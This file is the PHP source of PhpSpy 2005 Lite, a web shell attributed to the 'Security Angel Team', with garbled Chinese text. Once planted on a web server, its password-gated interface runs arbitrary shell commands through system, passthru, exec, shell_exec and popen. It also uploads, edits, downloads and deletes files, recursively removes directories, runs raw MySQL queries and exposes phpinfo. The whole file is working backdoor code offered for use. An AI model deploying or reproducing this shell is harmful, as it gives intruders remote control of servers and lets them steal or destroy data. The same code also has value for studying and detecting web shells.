<?php
/*
+--------------------------------------------------------------------------+
| str_replace("-", "", "P-h-p-S-p-y") Version:2005 Lite                    |
| Codz by Angel                                                            |
| (c) 2004 Security Angel Team                                             |
| http://www.4ngel.net                                                     |
| ======================================================================== |
| Team:  http://www.4ngel.net                                              |
|        http://www.bugkidz.org                                            |
| Email: 4ngel@21cn.com                                                    |
| Date:  Dec 28st(My girl friend's birthday), 2004                         |
+--------------------------------------------------------------------------+
*/

/*
ʾپһЩаעȥ
*/

error_reporting(7);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];

/*=====================  =====================*/

// ǷҪ֤,1ΪҪ֤,Ϊֱӽ.ѡЧ
$admin['check']="1";

// Ҫ֤,޸ĵ½
$admin['pass']="angel";

/*===================== ý =====================*/


//  register_globals = off Ļ¹
if ( function_exists('ini_get') ) {
	$onoff = ini_get('register_globals');
} else {
	$onoff = get_cfg_var('register_globals');
}
if ($onoff != 1) {
	@extract($_POST, EXTR_SKIP);
	@extract($_GET, EXTR_SKIP);
}

$self = $_SERVER['PHP_SELF'];

/*===================== ֤ =====================*/
if($admin['check']=="1") {
	if ($_GET['action'] == "logout") {
		setcookie ("adminpass", "");
		echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
		echo "<span style=\"font-size: 12px; font-family: Verdana\">עɹ......<p><a href=\"".$self."\">Զ˳򵥻˳&gt;&gt;&gt;</a></span>";
		exit;
	}
	if ($login) {
		$adminpass=trim($_POST['adminpass']);
		if ($adminpass==$admin['pass']) {
			setcookie ("adminpass",$admin['pass'],time()+(1*24*3600));
			echo "<meta http-equiv=\"refresh\" content=\"3;URL=".$self."\">";
			echo "<span style=\"font-size: 12px; font-family: Verdana\">½ɹ......<p><a href=\"".$self."\">Զת򵥻&gt;&gt;&gt;</a></span>";
			exit;
		}
	}
	if (isset($_COOKIE['adminpass'])) {
		if ($_COOKIE['adminpass']!=$admin['pass']) {
			loginpage();
		}
	} else {
		loginpage();
	}
}//end check
/*===================== ֤ =====================*/

// ж magic_quotes_gpc ״̬
if (get_magic_quotes_gpc()) {
    $_GET = stripslashes_array($_GET);
	$_POST = stripslashes_array($_POST);
}

if ($_GET['action'] == "phpinfo") {
	$dis_func = get_cfg_var("disable_functions");
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo() ѱ,鿴&lt;PHP&gt;";
	exit;
}

// ļ
if (!empty($downfile)) {
	if (!@file_exists($downfile)) {
		echo "<script>alert('Ҫµļ!')</script>";
	} else {
		$filename = basename($downfile);
		$filename_info = explode('.', $filename);
		$fileext = $filename_info[count($filename_info)-1];
		header('Content-type: application/x-'.$fileext);
		header('Content-Disposition: attachment; filename='.$filename);
		header('Content-Description: PHP Generated Data');
		header('Content-Length: '.filesize($downfile));
		@readfile($downfile);
		exit;
	}
}

// Ŀ¼
$pathname=str_replace('\\','/',dirname(__FILE__)); 

// ȡǰ·
if (!isset($dir) or empty($dir)) {
	$dir = ".";
	$nowpath = getPath($pathname, $dir);
} else {
	$dir=$_GET['dir'];
	$nowpath = getPath($pathname, $dir);
}

// ж϶д
if (dir_writeable($nowpath)) {
	$dir_writeable = "д";
} else {
	$dir_writeable = "д";
}

$dis_func = get_cfg_var("disable_functions");
$phpinfo=(!eregi("phpinfo",$dis_func)) ? " | <a href=\"?action=phpinfo\" target=\"_blank\">PHPINFO()</a>" : "";
$shellmode=(!get_cfg_var("safe_mode")) ? " | <a href=\"?action=shell\">WebShell</a>" : "";
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>PhpSpy Ver 2005</title>
<style type="text/css">
body,td {
	font-family: "sans-serif";
	font-size: "12px";
	line-height: "150%";
}
.smlfont {
	font-family: "sans-serif";
	font-size: "11px";
}
.INPUT {
	FONT-SIZE: "12px";
	COLOR: "#000000";
	BACKGROUND-COLOR: "#FFFFFF";
	height: "18px";
	border: "1px solid #666666";
}
.redfont {
	COLOR: "#A60000";
}
a:link,
a:visited,
a:active{
	color: "#000000";
	text-decoration: underline;
}
a:hover{
	color: "#465584";
	text-decoration: none;
}
.firstalt	{BACKGROUND-COLOR: "#EFEFEF"}
.secondalt	{BACKGROUND-COLOR: "#F5F5F5"}
</style>
</head>

<body style="table-layout:fixed; word-break:break-all">
<center>
<table width="760" border="0" cellpadding="3" cellspacing="0" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td width="375" align="right" nowrap><b><?=$_SERVER['HTTP_HOST']?></b></td>
    <td width="10" align="center" nowrap><b>:</b></td>
    <td width="375" nowrap><b><?=$_SERVER['REMOTE_ADDR']?></b></td>
  </tr>
  <tr>
    <td colspan="3" align="center" nowrap><a href="?action=logout">עỰ</a> | <a href="?action=dir"> PhpSpy Ŀ¼</a> | <a href="?action=phpenv">PHP</a><?=$phpinfo?><?=$shellmode?> | <a href="?action=sql">SQL Query</a> | <a href="http://www.4ngel.net" target="_blank" title="ش˳">Version 2005</a></td>
  </tr>
</table>
<hr width="760" noshade>
<table width="760" border="0" cellpadding="0">
 <form action="" method="GET">
  <tr>
    <td><p>·:<?=$pathname?><br>ǰĿ¼(<?=$dir_writeable?>,<?=substr(base_convert(@fileperms($nowpath),10,8),-4);?>):<?=$nowpath?>
        <br>תĿ¼:
        <input name="dir" type="text" class="INPUT">
        <input type="submit" class="INPUT" value="ȷ"> ֧־··
    </p></td>
  </tr>
 </form>
 <form action="?dir=<?=urlencode($dir)?>" method="POST" enctype="multipart/form-data">
  <tr>
    <td colspan="2">ϴļǰĿ¼:
      <input name="uploadmyfile" type="file" class="INPUT">	<input type="submit" name="uploadfile" class="INPUT" value="ȷ"><input type="hidden" name="uploaddir" value="<?=$dir?>"></td>
  </tr>
  </form>
  <form action="?action=editfile&dir=<?=urlencode($dir)?>" method="POST">
  <tr>
    <td colspan="2">½ļڵǰĿ¼:
        <input name="newfile" type="text" class="INPUT" value="">
        <input type="submit" name="createfile" class="INPUT" value="ȷ"></td>
  </tr>
  </form>
</table>
<hr width="760" noshade>
<?php
/*===================== ִв ʼ =====================*/
echo "<p><b>\n";
// ɾļ
if(@$delfile!="") {
	if(file_exists($delfile)) {
		if (@unlink($delfile)) {
			echo "".$delfile." ɾɹ!";
		} else {
			echo "ļɾʧ!";
		}
	} else {
		echo "ļѲ,ɾʧ!";
	}
}

// ɾĿ¼
elseif($rmdir) {
	if($deldir!="") {
		$deldirs="$dir/$deldir";
		if(!file_exists("$deldirs")) {
			echo "Ŀ¼Ѳ!";
		} else {
			deltree($deldirs);
		}
	} else {
		echo "ɾʧ!";
	}
}

// ϴļ
elseif($uploadfile) {
	echo $msg=@copy($_FILES['uploadmyfile']['tmp_name'],"".$uploaddir."/".$_FILES['uploadmyfile']['name']."") ? "ϴɹ!" : "ϴʧ!";
}

// ༭ļ
elseif($doeditfile) {
	$filename="$editfilename";
	@$fp=fopen("$filename","w");
	echo $msg=@fwrite($fp,$_POST['filecontent']) ? "дļɹ!" : "дʧ!";
	@fclose($fp);
}

// MYSQL
elseif($connect) {
	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {
		echo "ݿӳɹ!";
		mysql_close();
	} else {
		echo mysql_error();
	}
}

// ִSQL
elseif($doquery) {
	@mysql_connect($servername,$dbusername,$dbpassword) or die("ݿʧ");
	@mysql_select_db($dbname) or die("ѡݿʧ");
	$result = @mysql_query($_POST['sql_query']);
	echo ($result) ? "SQLɹִ" : ": ".mysql_error();
	mysql_close();
}

// 鿴PHPò״
elseif($viewphpvar) {
	echo "ò ".$_POST['phpvarname']." : ".getphpcfg($_POST['phpvarname'])."";
}

else {
	echo " <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel</a> С angel [<a href=\"http://www.bugkidz.org\" target=\"_blank\">BST</a>] , <a href=\"http://www.4ngel.net\" target=\"_blank\">www.4ngel.net</a> °汾.";
}

echo "</b></p>\n";
/*===================== ִв  =====================*/

if (!isset($_GET['action']) OR empty($_GET['action']) OR ($_GET['action'] == "dir")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr bgcolor="#cccccc">
    <td align="center" nowrap width="30%"><b>ļ</b></td>
	<td align="center" nowrap width="17%"><b></b></td>
    <td align="center" nowrap width="17%"><b>޸</b></td>
    <td align="center" nowrap width="12%"><b>С</b></td>
    <td align="center" nowrap width="7%"><b></b></td>
    <td align="center" nowrap width="17%"><b></b></td>
  </tr>
<?php
// Ŀ¼б
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="1"){
		if($file!=".." && $file!=".")	{
			$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
			$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
			$dirperm=substr(base_convert(fileperms($filepath),10,8),-4);
			echo "<tr class=".getrowbg().">\n";
			echo "  <td style=\"padding-left: 5px;\">[<a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\"><font color=\"#006699\">$file</font></a>]</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">&lt;dir&gt;</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$dirperm</td>\n";
			echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?action=deldir&dir=".urlencode($dir)."&deldir=".urlencode($file)."\">ɾ</a></td>\n";
			echo "</tr>\n";
			$dir_i++;
		} else {
			if($file=="..") {
				echo "<tr class=".getrowbg().">\n";
				echo "  <td nowrap colspan=\"6\" style=\"padding-left: 5px;\"><a href=\"?dir=".urlencode($dir)."/".urlencode($file)."\">ϼĿ¼</a></td>\n";
				echo "</tr>\n";
			}
		}
	}
}//while
@closedir($dirs); 
?>
<tr bgcolor="#cccccc">
  <td colspan="6" height="5"></td>
</tr>
<?
// ļб
$dirs=@opendir($dir);
while ($file=@readdir($dirs)) {
	$filepath="$dir/$file";
	$a=@is_dir($filepath);
	if($a=="0"){
		$size=@filesize($filepath);
		$size=$size/1024 ;
		$size= @number_format($size, 3);
		
		$ctime=@date("Y-m-d H:i:s",@filectime($filepath));
		$mtime=@date("Y-m-d H:i:s",@filemtime($filepath));
		
		@$fileperm=substr(base_convert(@fileperms($filepath),10,8),-4);
		echo "<tr class=".getrowbg().">\n";
		echo "  <td style=\"padding-left: 5px;\"><a href=\"$filepath\" target=\"_blank\">$file</a></td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$ctime</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$mtime</td>\n";
		echo "  <td align=\"right\" nowrap valign=\"top\" class=\"smlfont\"><span class=\"redfont\">$size</span> KB</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\" class=\"smlfont\">$fileperm</td>\n";
		echo "  <td align=\"center\" nowrap valign=\"top\"><a href=\"?downfile=".urlencode($filepath)."\"></a> | <a href=\"?action=editfile&dir=".urlencode($dir)."&editfile=".urlencode($file)."\">༭</a> | <a href=\"?dir=".urlencode($dir)."&delfile=".urlencode($filepath)."\">ɾ</a></td>\n";
		echo "</tr>\n";
		$file_i++;
	}
}
@closedir($dirs); 
?>
<tr class="<?=getrowbg()?>">
  <td nowrap colspan="6" align="right"><?=$dir_i?> Ŀ¼ / <?=$file_i?> ļ</td>
    </tr>
  </table></td>
</tr>
</table>

<?php
}// end dir

elseif ($_GET['action'] == "editfile") {
	if($newfile=="") {
		$filename="$dir/$editfile";
		$fp=@fopen($filename,"r");
		$contents=@fread($fp, filesize($filename));
		@fclose($fp);
		$contents=htmlspecialchars($contents);
	}else{
		$editfile=$newfile;
		$filename = "$dir/$editfile";
	}
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">½/༭ļ [<a href="?dir=<?=urlencode($dir)?>"></a>]</td>
  </tr>
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">ǰļ:<input class="input" type="text" name="editfilename" size="30"
value="<?=$filename?>"> ļļ</td>
  </tr>  
  <tr class="firstalt">
    <td align="center"><textarea name="filecontent" cols="100" rows="20"><?=$contents?></textarea></td>
  </tr>  
  <tr class="secondalt">
    <td align="center"><input type="submit" name="doeditfile" value="ȷд" class="input">
      <input type="reset" value="" class="input"></td>
  </tr>
  </form>
</table>
<?php
}//end editfile

elseif ($_GET['action'] == "shell") {
	if (!get_cfg_var("safe_mode")) {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">WebShell Mode</td>
  </tr>
  <form action="?action=shell&dir=<?=urlencode($dir)?>" method="POST">
  <tr class="secondalt">
    <td align="center">
	  ѡִк:
	  <select name="execfunc" class="input">
		<option value="system" <? if ($execfunc=="system") { echo "selected"; } ?>>system</option>
		<option value="passthru" <? if ($execfunc=="passthru") { echo "selected"; } ?>>passthru</option>
		<option value="exec" <? if ($execfunc=="exec") { echo "selected"; } ?>>exec</option>
		<option value="shell_exec" <? if ($execfunc=="shell_exec") { echo "selected"; } ?>>shell_exec</option>
		<option value="popen" <? if ($execfunc=="popen") { echo "selected"; } ?>>popen</option>
	  </select>
	  :
      <input type="text" name="command" size="60" value="<?=$_POST['command']?>" class="input">
      <input type="submit" value="execute" class="input"></td>
  </tr>  
  <tr class="secondalt">
    <td align="center"><textarea name="textarea" cols="100" rows="25" readonly><?php
	if (!empty($_POST['command'])) {
		if ($execfunc=="system") {
			system($_POST['command']);
		} elseif ($execfunc=="passthru") {
			passthru($_POST['command']);
		} elseif ($execfunc=="exec") {
			$result = exec($_POST['command']);
			echo $result;
		} elseif ($execfunc=="shell_exec") {
			$result=shell_exec($_POST['command']);
			echo $result;	
		} elseif ($execfunc=="popen") {
			$pp = popen($_POST['command'], 'r');
			$read = fread($pp, 2096);
			echo $read;
			pclose($pp);
		} else {
			system($_POST['command']);
		}
	}
	?></textarea></td>
  </tr>  
  </form>
</table>
<?php
	} else {
?>
<p><b>Safe_Mode Ѵ, ޷ִϵͳ.</b></p>
<?php
	}
}//end shell

elseif ($_GET['action'] == "deldir") {
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <form action="?dir=<?=urlencode($dir)?>" method="POST">
  <tr class="firstalt">
    <td align="center">ɾ <input name="deldir" type="text" value="<?=$deldir?>" class="input" readonly> Ŀ¼</td>
  </tr>  
  <tr class="secondalt">
    <td align="center">ע:Ŀ¼ǿ,˴βɾĿ¼µļ.ȷ?</td>
  </tr>  
  <tr class="firstalt">
    <td align="center">
	  <input type="submit" name="rmdir" value="delete" class="input">
	</td>
  </tr>  
  </form>
</table>
<?php
}//end deldir

elseif ($_GET['action'] == "sql") {
	$servername = isset($servername) ? $servername : 'localhost';
	$dbusername = isset($dbusername) ? $dbusername : 'root';
	$dbpassword = isset($dbpassword) ? $dbpassword : '';
	$dbname = isset($dbname) ? $dbname : '';
?>
<table width="760" border="0" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
  <tr class="firstalt">
    <td align="center">ִ SQL </td>
  </tr>
  <form action="?action=sql" method="POST">
  <tr class="secondalt">
    <td align="center">Host:
    <input name="servername" type="text" class="INPUT" value="<?=$servername?>"> 
    User:
    <input name="dbusername" type="text" class="INPUT" size="15" value="<?=$dbusername?>">
    Pass:
    <input name="dbpassword" type="text" class="INPUT" size="15" value="<?=$dbpassword?>">
    DB:
    <input name="dbname" type="text" class="INPUT" size="15" value="<?=$dbname?>">
    <input name="connect" type="submit" class="INPUT" value=""></td>
  </tr>
  <tr class="firstalt">
    <td align="center"><textarea name="sql_query" cols="85" rows="10"></textarea></td>
  </tr>
  <tr class="secondalt">
    <td align="center"><input type="submit" name="doquery" value="ִ" class="input"></td>
  </tr>  
  </form>
</table>
<?php
}//end sql query

elseif ($_GET['action'] == "phpenv") {
?>
<table width="760" border="0" align="center" cellpadding="3" cellspacing="1" bgcolor="#ffffff">
 <form action="?action=phpenv" method="POST">
  <tr class="firstalt">
    <td style="padding-left: 5px;"><b>鿴PHPò״</b></td>
  </tr>
  <tr class="secondalt">
    <td style="padding-left: 5px;">ò(:magic_quotes_gpc):<input name="phpvarname" type="text" class="input" size="40"> <input type="submit" name="viewphpvar" value="鿴" class="input"></td>
  </tr>
 </form>
</table>
<?php
}//end phpenv
?>
<hr width="760" noshade>
<table width="760" border="0" cellpadding="0">
  <tr>
    <td>Copyright (C) 2004 Security Angel Team [S4T] All Rights Reserved.</td>
    <td align="right"><?php
	debuginfo();
	ob_end_flush();	
	?></td>
  </tr>
</table>
</center>
</body>
</html>

<?php

/*======================================================

======================================================*/

	// ½
	function loginpage() {
?>
		<style type="text/css">
		input {
			font-family: "Verdana";
			font-size: "11px";
			BACKGROUND-COLOR: "#FFFFFF";
			height: "18px";
			border: "1px solid #666666";
		}
		</style>
		<form method="POST" action="">
		<span style="font-size: 11px; font-family: Verdana">Password: </span><input name="adminpass" type="password" size="20">
		<input type="submit" name="login" value="OK">
		</form>
<?php
		exit;
	}//end loginpage()

	// ҳϢ
	function debuginfo() {
		global $starttime;
		$mtime = explode(' ', microtime());
		$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);
		echo "Processed in $totaltime second(s)";
	}

	// ȥתַ
	function stripslashes_array(&$array) {
		while(list($key,$var) = each($array)) {
			if ($key != 'argc' && $key != 'argv' && (strtoupper($key) != $key || ''.intval($key) == "$key")) {
				if (is_string($var)) {
					$array[$key] = stripslashes($var);
				}
				if (is_array($var))  {
					$array[$key] = stripslashes_array($var);
				}
			}
		}
		return $array;
	}

	// ɾĿ¼
	function deltree($deldir) {
		$mydir=@dir($deldir);	
		while($file=$mydir->read())	{ 		
			if((is_dir("$deldir/$file")) AND ($file!=".") AND ($file!="..")) { 
				@chmod("$deldir/$file",0777);
				deltree("$deldir/$file"); 
			}
			if (is_file("$deldir/$file")) {
				@chmod("$deldir/$file",0777);
				@unlink("$deldir/$file");
			}
		} 
		$mydir->close(); 
		@chmod("$deldir",0777);
		echo @rmdir($deldir) ? "Ŀ¼ɾɹ!" : "<font color=\"#ff0000\">Ŀ¼ɾʧ!</font>";	
	} 

	// ж϶д
	function dir_writeable($dir) {
		if (!is_dir($dir)) {
			@mkdir($dir, 0777);
		}
		if(is_dir($dir)) {
			if ($fp = @fopen("$dir/test.txt", 'w')) {
				@fclose($fp);
				@unlink("$dir/test.txt");
				$writeable = 1;
			} else {
				$writeable = 0;
			}
		}
		return $writeable;
	}

	// мıɫ滻
	function getrowbg() {
		global $bgcounter;
		if ($bgcounter++%2==0) {
			return "firstalt";
		} else {
			return "secondalt";
		}
	}

	// ȡǰļϵͳ·
	function getPath($mainpath, $relativepath) {
		global $dir;
		$mainpath_info           = explode('/', $mainpath);
		$relativepath_info       = explode('/', $relativepath);
		$relativepath_info_count = count($relativepath_info);
		for ($i=0; $i<$relativepath_info_count; $i++) {
			if ($relativepath_info[$i] == '.' || $relativepath_info[$i] == '') continue;
			if ($relativepath_info[$i] == '..') {
				$mainpath_info_count = count($mainpath_info);
				unset($mainpath_info[$mainpath_info_count-1]);
				continue;
			}
			$mainpath_info[count($mainpath_info)] = $relativepath_info[$i];
		} //end for
		return implode('/', $mainpath_info);
	}

	// PHPò
	function getphpcfg($varname) {
		switch($result = get_cfg_var($varname)) {
			case 0:
			return No;
			break;
			case 1:
			return Yes;
			break;
			default:
			return $result;
			break;
		}
	}
?>